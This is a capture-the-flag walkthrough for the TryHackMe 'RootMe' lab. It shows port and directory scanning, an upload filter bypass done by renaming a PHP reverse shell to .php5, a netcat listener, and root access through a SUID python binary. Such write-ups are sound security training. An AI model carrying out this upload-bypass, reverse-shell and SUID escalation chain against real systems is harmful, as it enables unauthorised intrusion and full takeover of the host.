---
description: https://tryhackme.com/room/rrootme
---

# RootMe

## :map: Reconnaissance

### **Scan the machine, how many ports are open?**

```
nmap 10.10.203.184
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 09-11-19.png>)

### **What version of Apache are running?**

```
nmap -sV -p80 10.10.203.184
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 09-12-48.png>)

### **What service is running on port 22?**

> **ssh**

### **What is the hidden directory?**

```
gobuster dir -u http://10.10.203.184 \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 09-15-08.png>)

## :shell: Getting a shell

```bash
mv php-reverse-shell.php shell.php5
# http://10.10.203.184/panel
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 09-31-22.png>)

```bash
nv -nvlp 4444
# http://10.10.203.184/uploads
$ find / -type f -name user.txt 2>/dev/null
$ cat /var/www/user.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 09-41-18.png>)

## :top: Privilege escalation

```
$ find / -type f -perm -4000 2>/dev/null
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ /usr/bin/python -c 'import os; os.execl("/bin/bash", "bash", "-p")'
# cat /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 09-34-35.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-24 09-51-19.png>)

## :link: Support Material

{% embed url="https://github.com/xapax/security/blob/master/bypass_image_upload.md" %}

{% embed url="https://gtfobins.github.io/gtfobins/python/#suid" %}
